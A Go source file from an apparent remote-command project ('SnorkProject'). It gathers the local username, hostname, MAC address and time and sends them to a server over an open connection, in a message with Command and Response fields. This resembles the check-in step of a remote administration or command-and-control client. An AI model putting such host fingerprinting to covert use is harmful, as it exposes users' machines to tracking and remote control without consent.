package system

import (
	"net"
	"os"
	"os/user"
	"time"

	"github.com/nb-322/SnorkProject/internal/protocol"
)

func getUsername() string {
	currUser, err := user.Current()
	if err == nil && currUser.Username != "" {
		return currUser.Username
	}

	envUser := os.Getenv("USERNAME")
	if envUser == "" {
		envUser = os.Getenv("USER")
	}

	if envUser != "" {
		return envUser
	}

	return "unknown_user"
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil || hostname == "" {
		return "unknown_host"
	}
	return hostname
}

func getMacAddress() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}

	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp != 0 && len(iface.HardwareAddr) > 0 {
			if iface.Flags&net.FlagLoopback == 0 {
				return iface.HardwareAddr.String()
			}
		}
	}

	return "00:00:00:00:00:00"
}

func getTime() string {
	return time.Now().Format("2006-01-02 15:04:05")
}

func GetClientInfo() *protocol.Message {
	username := getUsername()
	hostname := getHostname()
	macAddress := getMacAddress()
	t := getTime()

	return &protocol.Message{
		Command:  "",
		Response: "",
		UserInfo: protocol.UserInfo{
			Username: username,
			Hostname: hostname,
			MacAddr:  macAddress,
			Time:     t,
		},
	}
}

func SendClientInfo(conn net.Conn) error {
	msg := GetClientInfo()

	return protocol.ReliableSend(conn, *msg)
}
